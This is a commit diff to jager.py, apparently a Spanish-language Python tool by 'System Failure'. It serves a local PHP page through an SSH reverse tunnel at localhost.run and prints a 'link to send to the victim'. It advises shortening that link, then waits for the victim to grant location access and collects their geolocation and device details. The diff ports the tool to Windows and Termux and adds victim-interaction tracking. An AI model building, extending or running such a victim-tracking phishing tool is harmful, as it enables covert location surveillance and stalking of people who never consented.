Actualizar jager.py

+++ jager.py
@@ -1,5 +1,4 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+# Jager by System Failure
 import json
 import time
 import os.path
@@ -25,15 +24,19 @@ bbg = Back.BLACK
 r = Style.RESET_ALL
 
 linea = vr + '_______________________________________________' + r
+captura = 'vigo/foto/captura'
 sign = vr + '[' + r + '-' + vr + ']' + r
 warn = am + '[' + r + rj + '!'+ r + am + ']' + r
+interaccion = "ubicacion/php/status.txt"
 ubicacion = "ubicacion/php/result.txt"
 eubicacion = "ubicacion/php/eresult.txt"
 caracteristicas = "ubicacion/php/info.txt"
 
 def banner():
-	os.system('clear')
-	print (bl + '''		     ██╗ █████╗  ██████╗ ███████╗██████╗ 
+	os.system(clear)
+	print (bl + '''\n\n
+
+		     ██╗ █████╗  ██████╗ ███████╗██████╗ 
 		     ██║██╔══██╗██╔════╝ ██╔════╝██╔══██╗
 		     ██║███████║██║  ███╗█████╗  ██████╔╝
 		██   ██║██╔══██║██║   ██║██╔══╝  ██╔══██╗
@@ -41,21 +44,44 @@ def banner():
 		 ╚════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n''' + r)
 	print ('        ' + rj + br + '	   .:|' + r + bl + br + ' Localización de dispositivos ' + r + rj + br + '|:.\n' + r)
 	print ('		' + brj + ng + '__________________________________________' + r)
-	print ('		' + bbl + ng + '__________ Informática y Hacking _________' + r)
+	print ('		' + bbl + ng + '________________ Prototype _______________' + r)
 	print ('		' + brj + ng + '__________________________________________' + r)
-	print ('		' + bbl + ng + '__https://informaticayhacking.github.com__' + r)
+	print ('		' + bbl + ng + '__________________________________________' + r)
 	print ('		' + brj + ng + '__________________________________________' + r)
-	print ('		' + bbl + ng + '_________t.me/InformaticayHacking_________' + r)
+	print ('		' + bbl + ng + '__________ t.me/+NzJDZaOyojE1ZTZh ________' + r)
 	print ('		' + brj + ng + '__________________________________________\n\n' + r)
 
-os.system('rm ubicacion/php/result.txt')
+windows = os.path.exists("C:")
+linux = os.path.exists("/usr/")
+termux = os.path.exists("/data/data/com.termux/")
+if windows:
+	print (ng+bvr+"Ejecutando en Windows"+r)
+	time.sleep(2)
+	clear = "cls"
+	rm = "del"
+elif linux:
+	print (ng+bvr+"Ejecutando en Linux"+r)
+	time.sleep(2)
+	clear = "clear"
+	os.system('pkill php')
+	rm = "rm"
+elif termux:
+	print (ng+bvr+"Ejecutando en Linux"+r)
+	time.sleep(2)
+	clear = "clear"
+	os.system('pkill php')
+	rm = "rm"
+os.system(rm+' ubicacion/php/result.txt')
 f = open(ubicacion, "w+")
 f.close()
-os.system('rm ubicacion/php/eresult.txt')
+os.system(rm+' ubicacion/php/eresult.txt')
 e = open(eubicacion, 'w+')
 e.close()
-os.system('clear')
-os.system('pkill php')
+os.system(rm+' ubicacion/php/status.txt')
+s = open(interaccion, 'w+')
+s.close()
+os.system(clear)
+
 def conexion():
 	ltam = os.path.getsize('jphp.log')
 	ltams = os.path.getsize('jssh.log')
@@ -77,8 +103,7 @@ def conexion():
 			subp.Popen(['php', '-S', 'localhost:4646', '-t', 'ubicacion'], stderr=jphp, stdout=jphp)
 		with open('jssh.log', 'w') as jssh:
 			opr = subp.Popen(['ssh', '-R', '80:localhost:4646', 'nokey@localhost.run'], stdout = jssh)
-		time.sleep(5)
-		os.system('clear')
+		os.system(clear)
 		time.sleep(3)
 	except NameError:
 		time.sleep(3)
@@ -87,51 +112,80 @@ def conexion():
 		limpiar()
 	with open('jssh.log', 'r') as jssh:
 		salida = [linea.split() for linea in jssh]
-		a = salida[2]
-		b = ''.join(a)
-		url = b[50:]
-	os.system('reset')
-	os.system('clear')
+		if salida == []:
+			print (warn + rj + br + ' No fué posible establecer una conexión con el tunel ssh.' + r)
+			print (warn + am + br + ' Intente reiniciar el proceso.')
+			exit()
+		else:
+			a = salida[2]
+			b = ''.join(a)
+			url = b[50:]
+	if windows:
+		os.system(clear)
+	else:
+		os.system('reset')
+	os.system(clear)
 	banner()
 	print (sign + vr + ' Enlace para enviar a la víctima: ' + r + url)
 	esperar()
 
 def esperar():
+	flag = 1
 	marc = False
 	try:
 		while True:
 			try:
-				time.sleep(2)
+				est = os.path.getsize(interaccion)
 				tam = os.path.getsize(ubicacion)
 				tame = os.path.getsize(eubicacion)
 				if tam == 0 and marc == False:
-					print ('\n' + sign + ci + ' Obteniendo Ubicación...' + r + '\n')
+					print ('\n' + sign + ci + ' Es recomendable que use un acortador de enlaces.' + r + '\n')
+					print ('\n' + sign + ci + ' Esperando interacción de la víctima...' + r + '\n')
 					print (sign + vr + 'Si tarda demasiado,')
-					print (sign + vr + 'Presione ' + rj + 'Ctrl + C' + r + am + ' para salir.\n' + r)
+					print (sign + vr + 'Presione ' + rj + 'Ctrl + C' + r + vr + ' para salir.\n' + r)
 					marc = True
+				if est > 0 and flag == 1:
+					flag = 0
+					os.system(clear)
+					banner()
+					print ('\n' + sign + ci + ' La víctima ha interactuado con el sistema..' + r + '\n')
+					time.sleep(1)
+					print ('\n' + sign + ci + ' Obteniendo ubicación...' + r + '\n')
+					print (sign + vr + 'Si tarda demasiado,')
+					print (sign + vr + 'Presione ' + rj + 'Ctrl + C' + r + vr + ' para salir.\n' + r)
 				if tam > 0:
-					os.system('clear')
+					os.system(clear)
 					banner()
 					print (sign + vr + br + ' Ubicación adquirida con éxito..!\n' + r)
-					time.sleep(5)
-					os.system('reset')
+					time.sleep(1)
+					print (sign + vr + br + ' Procesando...\n' + r)
+					time.sleep(4)
+					if windows:
+						os.system(clear)
+					else:
+						os.system('reset')
 					break
 				elif tame > 0:
-					os.system('clear')
+					os.system(clear)
 					banner()
 					print (warn + rj + br + ' No fué posible obtener la ubicación, no se concedió el permiso.' + r)
 					time.sleep(3)
-					os.system('reset')
+					if windows:
+						os.system(clear)
+					else:
+						os.system('reset')
 					break
 				else:
 					pass
 			except:
-				print (warn + am + ' Operación interrumpida por el usuario.' + r)
+				print (warn + am + ' Operación interrumpida..!\n' + r)
+				exit()
 		else:
 			print (sign + rj + 'Error!' + r)
 	except:
+		print (warn + am + ' Operación interrumpida por el usuario.\n' + r)
 		limpiar()
-		print (warn + am + ' Operación interrumpida por el usuario.' + r)
+		exit()
 
 def detalles():
 	try:
@@ -170,13 +224,17 @@ def detalles():
 				print (linea)
 	except:
 		banner()
-		print (warn + am + br + ' Error de conexión, no se pudo recolectar datos.' + r)
+		print (warn + am + br + ' Error de conexión, no se pudo recolectar los datos.' + r)
+		print (warn + am + br + ' La interacción de la víctima con el sistema ha sido errónea.' + r)
 		time.sleep(5)
 		limpiar()
 def limpiar():
-	os.system('pkill php')
-	os.system('reset')
-	os.system('clear')
+	if windows:
+		os.system(clear)
+	else:
+		os.system('reset')
+		os.system('pkill php')
+	os.system(clear)
 
 def ejecucion():
 	limpiar()
@@ -184,5 +242,4 @@ def ejecucion():
 	detalles()
 ejecucion()
 sys.exit()
-# Creado por: System Failure | Informática y Hacking © 2023
-# https://informaticayhacking.github.com
+# Creado por: System Failure | Modification - R53 ©
